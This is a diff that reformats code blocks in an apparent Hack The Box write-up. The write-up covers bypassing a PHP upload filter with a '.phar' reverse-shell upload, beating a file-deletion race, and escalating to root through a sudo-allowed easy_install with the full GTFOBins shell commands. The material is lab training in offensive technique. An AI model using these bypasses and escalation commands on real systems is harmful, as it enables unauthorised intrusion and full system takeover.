@@ -94,21 +94,20 @@ Now we have access to a new functionality that uploads files to the server. I th
 ## The File upload 
 Let's check what I have to bypass to upload a php reverse shell.
 
-> checker.php:
-```php
-55 if($_POST['check']){
-56                                                                                          
-57   # File size must be less than 10kb.                                                    
-58   if ($_FILES['file']['size'] > 10000) {                                                 
-59   │ │ │ die("File too large!");                                                          
-60   │ }                                                                                    
-61   $file = $_FILES['file']['name'];                                                       
-62                                                                                          
-63   # Check if extension is allowed.                                                       
-64   $ext = getExtension($file);                                                            
-65   if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){           
-66   │ die("Extension not allowed!");                                                       
-67   }
+```php title="Checker.php" startLineNumber=55
+if($_POST['check']){
+                                                                                         
+  # File size must be less than 10kb.                                                    
+  if ($_FILES['file']['size'] > 10000) {                                                 
+  │ │ │ die("File too large!");                                                          
+  │ }                                                                                    
+  $file = $_FILES['file']['name'];                                                       
+                                                                                         
+  # Check if extension is allowed.                                                       
+  $ext = getExtension($file);                                                            
+  if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){           
+  │ die("Extension not allowed!");                                                       
+  }
 ```
 
 Seems that my file needs to be lower than *10kb* and not contain any of the extension of the line __65__, The more obvious thing to try is uploading a file with the name 'revshell.pHp' but this will not work because the `preg_match` function is specified to ignore case when ended with `/i` on line __65__.
@@ -138,16 +137,16 @@ grep -Evi 'php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar'
 
 I have 10 different options of extensions to try upload to the site and get php code executed. But I have another problem, I need to open the file to execute the code inside it, let's analise the code to find it.
 
-```php
-69   # Create directory to upload our file.                               
-70   $dir = "uploads/".md5(time())."/";                                   
-71   if(!is_dir($dir)){                                                   
-72   │ │ │ mkdir($dir, 0770, true);                                       
-73   │ }                                                                  
-74                                                                        
-75   # Upload the file.                                                   
-76   $final_path = $dir.$file;                                            
-77   move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
+```php startLineNumber=69
+# Create directory to upload our file.                               
+$dir = "uploads/".md5(time())."/";                                   
+if(!is_dir($dir)){                                                   
+│ │ │ mkdir($dir, 0770, true);                                       
+│ }                                                                  
+                                                                     
+# Upload the file.                                                   
+$final_path = $dir.$file;                                            
+move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
 ```
 
 Our file seams to be stored inside the `uploads/` folder followed by a subfolder named with a MD5 hash of the current timestamp and finally the filename that we gave when uploading. The _MD5_ hash will be really enoying to find each time but I as saved because the `uploads/` is a **directory listing** that show me all the subfolder inside it! </br>
@@ -156,45 +155,45 @@ Now seams all good to send the __PentestMonkey PHP Webshell__ named as 'rev.phar
 
 So, I start analyze the code again to see what happen to the file we just uploaded, and found the follow snnipet of code on file `checker.php`:
 
-```php
-35 function isitup($url){                                           
-36   $ch=curl_init();                                               
-37   curl_setopt($ch, CURLOPT_URL, trim($url));                     
-38   curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");      
-39   curl_setopt($ch, CURLOPT_HEADER, 1);                           
-40   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);                   
-41   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);                   
-42   curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);                   
-43   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);                   
-44   curl_setopt($ch, CURLOPT_TIMEOUT, 30);                         
-45   $f = curl_exec($ch);                                           
-46   $header = curl_getinfo($ch);                                   
-47   if($f AND $header['http_code'] == 200){                        
-48   │ return array(true,$f);                                       
-49   }else{                                                         
-50   │ return false;                                                
-51   }                                                              
-52   │ curl_close($ch);                                             
-53 }
+```php title="checker.php" startLineNumber=35
+function isitup($url){                                           
+  $ch=curl_init();                                               
+  curl_setopt($ch, CURLOPT_URL, trim($url));                     
+  curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");      
+  curl_setopt($ch, CURLOPT_HEADER, 1);                           
+  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);                   
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);                   
+  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);                   
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);                   
+  curl_setopt($ch, CURLOPT_TIMEOUT, 30);                         
+  $f = curl_exec($ch);                                           
+  $header = curl_getinfo($ch);                                   
+  if($f AND $header['http_code'] == 200){                        
+  │ return array(true,$f);                                       
+  }else{                                                         
+  │ return false;                                                
+  }                                                              
+  │ curl_close($ch);                                             
+}
 ```
-```php
-82   foreach($websites as $site){
-83   │ $site=trim($site);
-84   │ if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
-85   │ │ $check=isitup($site);
-86   │ │ if($check){
-87   │ │ │ echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
-88   │ │ }else{
-89   │ │ │ echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
-90   │ │ }
-91   │ }else{
-92   │ │ echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
-93   │ }
-94   }
-95   
-96   # Delete the uploaded file.
-97   @unlink($final_path);
-98 }
+```php startLineNumber=82
+  foreach($websites as $site){
+  │ $site=trim($site);
+  │ if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
+  │ │ $check=isitup($site);
+  │ │ if($check){
+  │ │ │ echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
+  │ │ }else{
+  │ │ │ echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
+  │ │ }
+  │ }else{
+  │ │ echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
+  │ }
+  }
+  
+  # Delete the uploaded file.
+  @unlink($final_path);
+}
 ```
 In the  line _97_ the file I uploaded are deleted after sending a request using the function `isitup`. So every time I send a file the upload it, made a request and after the request return the file got deleted! Analising this function I found on line _44_ that the request get a 30 seconds timeout. So to bypass this and I get time to execute the payload I need to input first on the file a URL that will not return anything like `https://google.com` because the HTB VPN isn't connect to the internet.
 
@@ -204,8 +203,7 @@ So now we are good to upload the revshell right? No, not yet. I uploaded the __P
 > _Figure 6_: **'Hello word' on the page.**
 
 So if it is executing the php code why our reverse shell don't work? Maybe some functions are disable? Let's check this with the `phpinfo` page.
-> payload.phar:
-```php
+```php title="payload.phar"
 https://google.com
 https://google.com
 https://google.com
@@ -218,8 +216,7 @@ https://google.com
 
 Reading all the functions that are disable, the most intesting one that ins't on the list is `proc_open` that let execute remote code on the victim machine. I made the follow payload to finally get a reverse shell:
 
-> revshell.phar
-```php
+```php title="revshell.phar"
 http://google.com
 http://google.com
 http://google.com
@@ -268,7 +265,7 @@ But when I tried to read the _user.txt_ file it returns a **"Permission denied"*
 # Privilege escalation
 
 After connect to the SSH I ran the command `sudo -l` that reveled the following permissons: 
-```bash
+```bash frame="none"
 $ sudo -l
 ...
     (ALL) NOPASSWD: /usr/local/bin/easy_install
@@ -276,8 +273,7 @@ $ sudo -l
 ```
 
 This means that I could run the file `/usr/local/bin/easy_install` as root without any passwords. So, let's check what this files does.
-__easy_install__:
-```python
+```python title="/usr/local/bin/easy_install"
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 import re
@@ -290,7 +286,7 @@ if __name__ == '__main__':
 ```
 
 We is using the __main__ funtion from the __easy_install__ lib. Research a little bit I found that easy_install have his own page on [GTFOBins](https://gtfobins.github.io/gtfobins/easy_install/). Opening the page and running the following commands we get a root shell.
-```bash
+```bash frame="none"
 TF=$(mktemp -d)
 echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 sudo easy_install $TF
